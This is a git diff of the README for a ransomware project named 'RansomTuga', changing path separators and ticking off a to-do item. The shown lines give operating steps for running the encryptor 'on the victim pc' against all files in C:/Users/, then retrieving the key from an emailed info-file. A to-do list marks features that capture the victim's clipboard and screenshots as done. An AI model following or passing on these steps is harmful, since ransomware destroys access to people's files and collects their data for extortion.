@@ -80,7 +80,7 @@ And many more!
 
 
 # How to use
-- Open `RansomTuga.exe` on the victim pc, if it is in debug mode it encrypts all files in `.\debugFolder\` or in the path defined in arguments else in `C:\Users\`
+- Open `RansomTuga.exe` on the victim pc, if it is in debug mode it encrypts all files in `./debugFolder/` or in the path defined in arguments else in `C:/Users/`
 - Download the attachment from the received email
 - Open `InfoDecryptor.exe` and select the attachment just downloaded, it decrypts the crypted info-file
 - Open the decrypted file and copy the key
@@ -88,7 +88,7 @@ And many more!
 
 
 # Todo
-- [ ] Fastest encryption modes (HeadOnly, DotPattern, SmartPattern, AdvancedSmartPattern)
+- [x] Fastest encryption modes (HeadOnly, DotPattern, SmartPattern, AdvancedSmartPattern)
 - [x] Random IV
 - [x] Get clipboard
 - [x] Get screenshot
